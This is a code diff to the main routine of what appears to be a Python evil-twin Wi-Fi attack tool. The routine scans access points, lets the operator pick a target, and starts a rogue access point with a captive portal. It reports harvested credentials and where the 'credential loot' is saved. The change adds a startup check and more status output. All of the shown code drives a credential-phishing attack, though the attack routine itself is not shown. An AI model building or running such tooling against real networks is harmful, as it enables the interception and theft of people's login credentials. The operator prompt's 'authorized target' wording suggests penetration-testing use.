@@ -553,7 +553,13 @@ def main():
         if not ap_list: print("No access points found", flush=True); return 0
         opts=[{"value":str(i),"label":f"{a['ssid']} · {a['bssid']} · ch {a['channel']}"} for i,a in enumerate(ap_list)]
         target=ap_list[int(request_input("Select authorized target", input_type="select", choices=opts))]
-        _start_attack(target); print(f"Evil twin active for {duration}s", flush=True)
+        _start_attack(target)
+        if not attack_running:
+            print(f"Evil twin failed to start on {_iface}.", flush=True)
+            return 1
+        print(f"Test AP: {target['ssid']} · Interface: {_iface} · Channel: {target['channel']}", flush=True)
+        print(f"Portal address after joining the AP: http://{GATEWAY_IP}:{PORTAL_PORT}/", flush=True)
+        print(f"Duration: {duration}s · Credential loot: {LOOT_DIR}", flush=True)
         end=time.time()+duration
         while time.time()<end and attack_running: print(f"credentials={len(credentials)}", flush=True); time.sleep(5)
         return 0
